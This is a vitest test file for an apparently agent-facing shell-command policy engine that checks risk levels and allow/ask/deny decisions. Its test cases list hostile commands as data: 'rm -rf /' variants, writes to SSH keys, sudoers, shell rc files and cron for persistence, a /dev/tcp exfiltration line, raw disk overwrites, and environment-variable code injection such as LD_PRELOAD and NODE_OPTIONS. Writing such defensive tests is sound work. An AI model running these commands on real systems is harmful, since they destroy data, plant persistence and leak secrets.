/**
 * M5 security pass: policy-engine hardening. One describe block per coordinator item.
 */
import { describe, expect, it } from "vitest";
import {
  classifyShellSegment,
  classifyWrites,
  evaluatePolicy,
  hasFlags,
  loadPolicyYaml,
  parseRedirections,
  parseSegment,
} from "../src/index.ts";
import { DEFAULT_POLICY, evalShell, shellAction, structuredAction } from "./helpers.ts";

const risk = (cmd: string) => classifyShellSegment(cmd, undefined).level;

// ── 1. Adapter-asserted risk is a floor BEFORE rule/default evaluation ────────────────
describe("1. asserted risk drives the decision", () => {
  const policy = loadPolicyYaml(`
rules:
  - id: deny-high
    match: { risk_at_least: high }
    decision: deny
`);

  it("risk_at_least rules see the asserted level", () => {
    const r = evalShell("ls", { policy, risk: { level: "high", reason: "adapter: sensitive file" } });
    expect(r).toMatchObject({ decision: "deny", rule_id: "deny-high" });
  });

  it("defaults use the asserted level (structured write asserted high → ask)", () => {
    const draft = structuredAction(
      { category: "filesystem", operation: "write", arguments: { path: ".env" } },
      { risk: { level: "high", reason: "writes .env" } },
    );
    expect(evaluatePolicy(DEFAULT_POLICY, draft)).toMatchObject({ decision: "ask", risk: { level: "high" } });
  });

  it("applies to every segment of a compound command", () => {
    const r = evalShell("ls && pwd", { policy, risk: { level: "critical", reason: "x" } });
    expect(r.segments.every((s) => s.risk.level === "critical" && s.decision === "deny")).toBe(true);
  });

  it("never lowers the inferred risk or a stricter decision", () => {
    expect(evalShell("rm -rf /", { risk: { level: "low", reason: "x" } })).toMatchObject({
      decision: "deny",
      risk: { level: "critical" },
    });
    expect(evalShell("git push", { risk: { level: "low", reason: "x" } }).decision).toBe("ask");
  });
});

// ── 2. deny-rm-rf by parsed argv ──────────────────────────────────────────────────────
describe("2. deny-rm-rf matches parsed argv", () => {
  it.each([
    "rm -rf /",
    "rm -fr /",
    "rm -Rf /",
    "rm -r -f /",
    "rm -f -r /",
    "rm --recursive --force /",
    "rm --force --recursive tmp",
    "rm -r --force /",
    "rm -rfv /",
    "rm -vrf /",
    "rm / -rf",
    "/bin/rm -rf /",
    "/usr/bin/rm -Rf /",
    "sudo rm -rf /",
    "sudo -u root rm -rf /",
    "command rm -rf /",
    "env FOO=1 rm -rf /",
    "nice -n 5 rm -rf /",
    "\\rm -rf /",
    "'rm' -rf /",
    "(rm -rf /)",
    "rm -rf / 2>/dev/null",
    "ls && rm -rf ~",
  ])("%s → deny", (cmd) => {
    expect(evalShell(cmd)).toMatchObject({ decision: "deny", rule_id: "deny-rm-rf" });
  });

  it.each([
    ["echo 'a; rm -rf /'", "allow"],
    ['echo "rm -rf /"', "allow"],
    ['git commit -m "rm -rf the build dir"', "allow"],
    ['grep -rn "rm -rf" docs', "allow"],
    ["farm -rf", "ask"],
    ["rm -r build", "ask"],
    ["rm -f file.txt", "ask"],
    ["rm -- -rf", "ask"],
    ["rmdir -p a/b", "ask"],
  ])("no false positive: %s → %s", (cmd, decision) => {
    const r = evalShell(cmd);
    expect(r.rule_id).not.toBe("deny-rm-rf");
    expect(r.decision).toBe(decision);
  });

  it("legacy regex rules keep working (YAML backward compatible)", () => {
    const policy = loadPolicyYaml(`
rules:
  - id: legacy
    match: { regex: "(^|\\\\s)rm\\\\s+-rf\\\\b" }
    decision: deny
`);
    expect(evalShell("rm -rf /", { policy })).toMatchObject({ decision: "deny", rule_id: "legacy" });
  });

  it("binary compares basenames on both sides", () => {
    const policy = loadPolicyYaml(`
rules:
  - match: { binary: /usr/bin/curl }
    decision: deny
`);
    expect(evalShell("sudo /usr/local/bin/curl x", { policy }).decision).toBe("deny");
    expect(evalShell("curlx x", { policy }).decision).not.toBe("deny");
  });

  it("binary / flags never match structured actions", () => {
    const policy = loadPolicyYaml(`
rules:
  - match: { flags: ["-f"] }
    decision: allow
`);
    expect(evaluatePolicy(policy, structuredAction({ category: "git", operation: "force_push" })).decision).toBe("ask");
  });

  describe("hasFlags", () => {
    it.each<[string[], string[], boolean]>([
      [["rm", "-rf"], ["-r", "-f"], true],
      [["rm", "-r"], ["-r", "-f"], false],
      [["rm", "--recursive=yes"], ["--recursive"], true],
      [["rm", "--recursively"], ["--recursive"], false],
      [["rm", "--", "-rf"], ["-r"], false],
      [["rm", "-"], ["-r"], false],
      [["tar", "-xzf", "a"], ["-x|-c", "-z"], true],
      [["x", "--rf"], ["-r"], false],
    ])("%j has %j → %s", (argv, specs, expected) => {
      expect(hasFlags(argv, specs)).toBe(expected);
    });
  });

  it("flags must be a non-empty list of non-empty strings", () => {
    expect(() => loadPolicyYaml(`rules:\n  - match: { flags: [] }\n    decision: deny\n`)).toThrow();
    expect(() => loadPolicyYaml(`rules:\n  - match: { flags: [""] }\n    decision: deny\n`)).toThrow();
    expect(() => loadPolicyYaml(`rules:\n  - match: { flags: "-r" }\n    decision: deny\n`)).toThrow();
  });
});

// ── 3. Typed action + command: judged on both ─────────────────────────────────────────
describe("3. structured action with a command is judged on both", () => {
  it("database.drop with command `ls` is not allowed", () => {
    const r = evaluatePolicy(DEFAULT_POLICY, structuredAction({ category: "database", operation: "drop", command: "ls" }));
    expect(r.decision).toBe("ask");
    expect(r.risk.level).toBe("critical");
  });

  it.each([
    [{ category: "payment", operation: "create", command: "echo ok" }, "ask", "critical"],
    [{ category: "secret", operation: "write", command: "true" }, "ask", "critical"],
    [{ category: "email", operation: "send", command: "cat body.txt" }, "ask", "high"],
    [{ category: "filesystem", operation: "write", command: "echo x > notes.txt" }, "allow", "medium"],
  ] as const)("%o → %s / %s", (spec, decision, level) => {
    const r = evaluatePolicy(DEFAULT_POLICY, structuredAction(spec));
    expect(r.decision).toBe(decision);
    expect(r.risk.level).toBe(level);
  });

  it("the command side still counts (git.push + rm -rf → deny)", () => {
    const r = evaluatePolicy(DEFAULT_POLICY, structuredAction({ category: "git", operation: "push", command: "rm -rf /" }));
    expect(r).toMatchObject({ decision: "deny", rule_id: "deny-rm-rf" });
  });

  it("structured rules apply even when a command is present", () => {
    const policy = loadPolicyYaml(`
rules:
  - id: deny-drop
    match: { action_type: database.drop }
    decision: deny
`);
    const r = evaluatePolicy(policy, structuredAction({ category: "database", operation: "drop", command: "ls" }));
    expect(r).toMatchObject({ decision: "deny", rule_id: "deny-drop" });
  });

  it("an allow rule on the command cannot allow a critical typed action", () => {
    const policy = loadPolicyYaml(`
rules:
  - match: { command_prefix: ls }
    decision: allow
`);
    const r = evaluatePolicy(policy, structuredAction({ category: "database", operation: "drop", command: "ls" }));
    expect(r.decision).toBe("ask");
  });

  it("plain shell actions are not double-counted", () => {
    const r = evaluatePolicy(DEFAULT_POLICY, shellAction("ls"));
    expect(r.segments).toHaveLength(1);
    expect(r.risk.level).toBe("low");
  });
});

// ── 4. Redirections and write targets ────────────────────────────────────────────────
describe("4. redirections", () => {
  describe("parseRedirections", () => {
    it.each<[string, string[]]>([
      ["echo x > out.txt", ["out.txt"]],
      ["echo x >out.txt", ["out.txt"]],
      ["echo x >> log", ["log"]],
      ["echo x >| log", ["log"]],
      ["cmd 2> err.log", ["err.log"]],
      ["cmd 2>>err.log", ["err.log"]],
      ["cmd &> all.log", ["all.log"]],
      ["cmd &>> all.log", ["all.log"]],
      ["cmd >& all.log", ["all.log"]],
      ["cmd <> rw.txt", ["rw.txt"]],
      ['echo x > "my file.txt"', ["my file.txt"]],
      ["echo x > a > b", ["a", "b"]],
      ["cmd 2>&1", []],
      ["cmd >&2", []],
      ["cmd 2>&-", []],
      ["cat < in.txt", []],
      ["cat <<< 'hi'", []],
      ['echo "a > b"', []],
      ["echo 'a >> b'", []],
      ["echo a\\>b", []],
    ])("%s → %j", (cmd, writes) => {
      expect(parseRedirections(cmd).writes).toEqual(writes);
    });

    it("removes the redirection (and its fd) from the command", () => {
      expect(parseSegment("cp a b 2>/dev/null").argv).toEqual(["cp", "a", "b"]);
      expect(parseSegment("npm test > out.log 2>&1").argv).toEqual(["npm", "test"]);
    });
  });

  describe("command write targets", () => {
    it.each<[string, string[]]>([
      ["tee a.txt", ["a.txt"]],
      ["tee -a a b", ["a", "b"]],
      ["dd if=x of=/dev/sda bs=1M", ["/dev/sda"]],
      ["cp a b", ["b"]],
      ["cp -r a b c/", ["c/"]],
      ["cp -t dest a b", ["dest"]],
      ["mv --target-directory=dest a", ["dest"]],
      ["install -m 755 x /usr/local/bin/x", ["/usr/local/bin/x"]],
      ["ln -s target link", ["link"]],
      ["sudo tee /etc/hosts", ["/etc/hosts"]],
      ["cp only-one-arg", []],
    ])("%s → %j", (cmd, writes) => {
      expect(parseSegment(cmd).writes).toEqual(writes);
    });
  });

  it.each([
    ["echo 'ssh-ed25519 AAA' >> ~/.ssh/authorized_keys", "high"],
    ["cat key.pub >> $HOME/.ssh/authorized_keys", "high"],
    ["echo TOKEN=x > .env", "high"],
    ["echo TOKEN=x >> .env.local", "high"],
    ["echo 'use nix' > .envrc", "high"],
    ["echo 'alias ls=rm' >> ~/.zshrc", "high"],
    ["echo x >> ~/.bashrc", "high"],
    ["echo x >> ~/.profile", "high"],
    ["echo '1.2.3.4 bank.com' >> /etc/hosts", "high"],
    ["cat hook.sh > .git/hooks/pre-commit", "high"],
    ["cat k > server.pem", "high"],
    ["cp key ~/.ssh/id_ed25519", "high"],
    ["mv agent.plist ~/Library/LaunchAgents/com.evil.plist", "high"],
    ["echo '* * * * * x' > /var/spool/cron/crontabs/me", "high"],
    ["tee -a ~/.bashrc", "high"],
    ["sudo tee /etc/sudoers.d/me", "high"],
    ["install -m 755 x /usr/local/bin/x", "high"],
    ["echo secret > /dev/tcp/1.2.3.4/80", "high"],
    ["crontab mycron", "high"],
    ["cat disk.img > /dev/sda", "critical"],
    ["cat disk.img > /dev/disk2", "critical"],
    ["cp disk.img /dev/nvme0n1", "critical"],
    ["tee /dev/sdb", "critical"],
    ["echo x > out.txt", "medium"],
    ["ls > files.txt", "medium"],
    ["cp a.txt b.txt", "medium"],
    ["echo x > /dev/null", "low"],
    ["ls 2>/dev/null", "low"],
    ["cat f 2>&1", "low"],
    ["crontab -l", "medium"],
  ])("%s → %s", (cmd, level) => {
    expect(risk(cmd)).toBe(level);
  });

  it("redirecting into a protected file is denied under the default policy", () => {
    expect(evalShell("echo 'ssh-ed25519 AAA' >> ~/.ssh/authorized_keys")).toMatchObject({ decision: "deny", rule_id: "deny-protected-paths" });
    expect(evalShell("echo x | tee -a ~/.zshrc")).toMatchObject({ decision: "deny", rule_id: "deny-protected-paths" });
    expect(evalShell("sudo tee /etc/hosts < hosts")).toMatchObject({ decision: "deny", rule_id: "deny-protected-paths" });
  });

  it("redirecting into a sensitive but unprotected file is ask", () => {
    expect(evalShell("echo TOKEN=x > .env").decision).toBe("ask");
    expect(evalShell("cat k > server.pem").decision).toBe("ask");
  });

  it("a write risk never lowers the command's own risk", () => {
    expect(risk("rm -rf / > log.txt")).toBe("critical");
    expect(risk("git push > push.log 2>&1")).toBe("high");
  });

  it("classifyWrites returns null when nothing meaningful is written", () => {
    expect(classifyWrites([])).toBeNull();
    expect(classifyWrites(["/dev/null", "/dev/stderr"])).toBeNull();
  });
});

// ── 5. "Read-only" tools that run code ────────────────────────────────────────────────
describe("5. tools that run code are not low risk", () => {
  it.each([
    "npm test",
    "npm run build",
    "npm run lint",
    "pnpm test",
    "yarn test",
    "bun run dev",
    "npx vitest run",
    "make",
    "make test",
    "bash script.sh",
    "sh ./configure",
    "python x.py",
    "python3 -m pytest",
    "node x.js",
    "tsx scripts/seed.ts",
  ])("%s is at least medium", (cmd) => {
    expect(["medium", "high", "critical"]).toContain(risk(cmd));
  });

  it("npm test stays allowed by the explicit default rule", () => {
    expect(evalShell("npm test")).toMatchObject({ decision: "allow", rule_id: "allow-npm-test", risk: { level: "medium" } });
  });

  it.each([
    `awk 'BEGIN { system("rm -rf ~") }'`,
    `awk '{ print | "sh" }' f`,
    `awk '{ "date" | getline d; print d }'`,
    `gawk 'BEGIN{system("id")}'`,
    "rg --pre ./evil.sh foo",
    "rg --pre=rm foo",
    "LESSOPEN='|rm -rf ~ %s' less f",
    "env LESSOPEN='|sh %s' less f",
    "GIT_EXTERNAL_DIFF=./evil git diff",
    "GIT_PAGER='sh -c id' git log",
    "PAGER='rm -rf ~' man ls",
    "GIT_SSH_COMMAND='sh -c \"rm -rf ~\"' git fetch",
    "LD_PRELOAD=./evil.so ls",
    "DYLD_INSERT_LIBRARIES=./evil.dylib ls",
    "BASH_ENV=./evil.sh bash build.sh",
    "NODE_OPTIONS='--require ./evil.js' npm test",
    "NODE_OPTIONS=--import=./evil.mjs node x.js",
    "GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.pager GIT_CONFIG_VALUE_0=evil git log",
    "git -c core.pager=evil log",
  ])("%s is never allowed", (cmd) => {
    expect(evalShell(cmd).decision).not.toBe("allow");
  });

  it.each([
    "awk -F'|' '{print $2}' f",
    "awk -F , '{print $2}' f",
    "awk '{print $1}' f",
    "sed -n 1p f",
    "rg foo src",
    "PAGER=cat git log",
    "GIT_PAGER=less git log",
    "GIT_EDITOR=true git merge --continue",
    "GIT_SSH_COMMAND='ssh -i ~/.ssh/deploy_key -o IdentitiesOnly=yes' git fetch",
    "NODE_OPTIONS=--max-old-space-size=4096 npm test",
    "CI=1 FORCE_COLOR=0 npm test",
  ])("%s is still allowed", (cmd) => {
    expect(evalShell(cmd).decision).toBe("allow");
  });

  it.each([
    ["git branch", "low"],
    ["git branch -a", "low"],
    ["git branch -vv", "low"],
    ["git remote -v", "low"],
    ["git branch -D main", "high"],
    ["git branch --delete old", "high"],
    ["git branch -m new", "high"],
    ["git remote add evil https://x", "high"],
    ["git remote set-url origin https://x", "high"],
  ])("%s → %s", (cmd, level) => {
    expect(risk(cmd)).toBe(level);
  });
});

// ── 6. Rules can target the wrapper chain ─────────────────────────────────────────────
describe("6. wrapper match", () => {
  const policy = loadPolicyYaml(`
rules:
  - id: deny-sudo
    match: { wrapper: sudo }
    decision: deny
  - id: ask-doas-or-pkexec
    match: { wrapper: [doas, /usr/bin/pkexec] }
    decision: ask
  - id: allow-git-status
    match: { command_prefix: "git status" }
    decision: allow
`);

  it.each([
    ["sudo git status", "deny", "deny-sudo"],
    ["sudo -u root ls", "deny", "deny-sudo"],
    ["/usr/bin/sudo ls", "deny", "deny-sudo"],
    ["env FOO=1 sudo ls", "deny", "deny-sudo"],
    ["ls && sudo ls", "deny", "deny-sudo"],
    ["doas ls", "ask", "ask-doas-or-pkexec"],
    ["git status", "allow", "allow-git-status"],
    ["echo sudo", "allow", null],
    ["sudoku", "ask", null],
  ])("%s → %s (%s)", (cmd, decision, rule) => {
    const r = evalShell(cmd, { policy });
    expect(r.decision).toBe(decision);
    expect(r.rule_id).toBe(rule);
  });

  it("wrapper can be combined with other conditions", () => {
    const p = loadPolicyYaml(`
rules:
  - match: { wrapper: sudo, binary: rm }
    decision: deny
`);
    expect(evalShell("sudo rm x", { policy: p }).decision).toBe("deny");
    expect(evalShell("rm x", { policy: p }).decision).toBe("ask");
    expect(evalShell("sudo ls", { policy: p }).decision).toBe("allow");
  });

  it("parseSegment exposes the wrapper chain and assignments", () => {
    expect(parseSegment("sudo -u root env A=1 nice -n 5 /bin/ls -la")).toEqual({
      argv: ["ls", "-la"],
      wrappers: ["sudo", "env", "nice"],
      assignments: [["A", "1"]],
      writes: [],
      deletes: [],
    });
  });
});

// ── Over-blocking guard: everyday dev commands keep their decisions ───────────────────
describe("no over-blocking of common dev commands", () => {
  it.each([
    ["git status", "allow", "low"],
    ["git diff", "allow", "low"],
    ["git diff --stat HEAD~1", "allow", "low"],
    ["git log --oneline -20", "allow", "low"],
    ["git log --oneline | head -20", "allow", "low"],
    ["ls -la", "allow", "low"],
    ["ls -la > /dev/null 2>&1", "allow", "low"],
    ["cat README.md", "allow", "low"],
    ["cat package.json | grep version", "allow", "low"],
    ["npm test", "allow", "medium"],
    ["npm test 2>&1 | tail -50", "allow", "medium"],
    ["npm install", "allow", "medium"],
    ["npm install -D vitest", "allow", "medium"],
    ["pnpm install", "allow", "medium"],
    ['git commit -m "fix: handle empty input"', "allow", "medium"],
    ["git add -A && git commit -m wip", "allow", "medium"],
    ["npm run build", "allow", "medium"],
    ["git diff > change.patch", "allow", "medium"],
    ["mkdir -p src/utils && touch src/utils/a.ts", "allow", "medium"],
  ])("%s → %s / %s", (cmd, decision, level) => {
    const r = evalShell(cmd);
    expect(r.decision).toBe(decision);
    expect(r.risk.level).toBe(level);
  });
});
